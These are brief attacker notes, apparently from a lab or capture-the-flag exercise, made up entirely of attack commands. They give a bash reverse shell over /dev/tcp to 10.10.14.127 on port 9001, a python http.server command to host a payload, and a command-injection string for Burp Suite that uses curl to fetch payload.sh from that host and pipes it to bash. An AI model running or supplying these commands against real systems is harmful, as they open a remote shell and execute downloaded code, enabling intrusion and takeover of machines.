/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.127/9001 0>&1'

server: python3 -m http.server 8001

In Burpsuite:
;curl http://10.10.14.127:8001/payload.sh|bash
